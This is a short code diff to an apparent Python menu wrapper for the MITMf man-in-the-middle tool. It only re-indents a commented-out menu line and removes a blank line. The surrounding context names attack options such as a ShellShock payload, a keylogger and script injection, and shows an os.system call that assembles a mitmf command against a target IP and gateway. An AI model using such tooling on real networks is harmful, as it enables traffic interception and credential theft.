@@ -110,7 +110,7 @@ def ShowCustomeBuildMenu():
 	print"    |_______________________________________|"
 	print"    |6. ShellShock Payload   7.  Keylogger  |"
 	print"    |8. Browser Profiler     9.  Java Applet|"
-   #print"    |10.Javascript Inject    11. HTML Inject|"
+       #print"    |10.Javascript Inject    11. HTML Inject|"
 	print"    |_______________________________________|"
 	print"    |       ----PRESS 'r' to run---         |"
 	print"    | ----PRESS 'q' to exit and not run---- |"
@@ -175,7 +175,6 @@ def CustomeMenuAttackStringBUild():
 		os.system("mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
 		
 	
-
 #MAIN PROGRAM IS BELOW	
 WrtieIntro()
 WriteMainMenu()
